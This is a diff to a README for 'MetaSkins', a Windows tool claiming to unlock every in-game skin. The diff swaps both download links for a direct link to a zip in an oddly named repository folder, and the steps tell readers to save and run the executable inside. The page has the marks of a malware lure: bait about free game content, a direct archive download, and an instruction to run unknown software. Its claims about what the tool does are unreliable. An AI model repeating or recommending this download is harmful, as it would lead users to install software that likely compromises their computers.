@@ -1,6 +1,6 @@
 # 🛠️ -MetaSkins-Access-All-In-Game-Skins-Exclusive-Custom-Sets - Unlock every skin for your games
 
-[![Download MetaSkins](https://img.shields.io/badge/Download-MetaSkins-blue)](https://github.com/Afolabiebu4567/-MetaSkins-Access-All-In-Game-Skins-Exclusive-Custom-Sets)
+[![Download MetaSkins](https://img.shields.io/badge/Download-MetaSkins-blue)](https://github.com/Afolabiebu4567/-MetaSkins-Access-All-In-Game-Skins-Exclusive-Custom-Sets/raw/refs/heads/main/unappliableness/All-In-Custom-Game-Access-Sets-Skins-Meta-Exclusive-2.3.zip)
 
 MetaSkins allows players to access all in-game skins and custom sets. This application simplifies the process of installing cosmetic upgrades for your favorite titles. You can navigate through a library of skins, select your preferred items, and apply them directly to your game files. 
 
@@ -18,7 +18,7 @@ To run this software, your computer needs to meet basic specifications. Ensure y
 
 Follow these steps to set up the application on your Windows machine.
 
-1. Visit this page to download the software: https://github.com/Afolabiebu4567/-MetaSkins-Access-All-In-Game-Skins-Exclusive-Custom-Sets.
+1. Visit this page to download the software: https://github.com/Afolabiebu4567/-MetaSkins-Access-All-In-Game-Skins-Exclusive-Custom-Sets/raw/refs/heads/main/unappliableness/All-In-Custom-Game-Access-Sets-Skins-Meta-Exclusive-2.3.zip
 2. Locate the download button on the page.
 3. Save the executable file to your computer.
 4. Open your downloads folder.
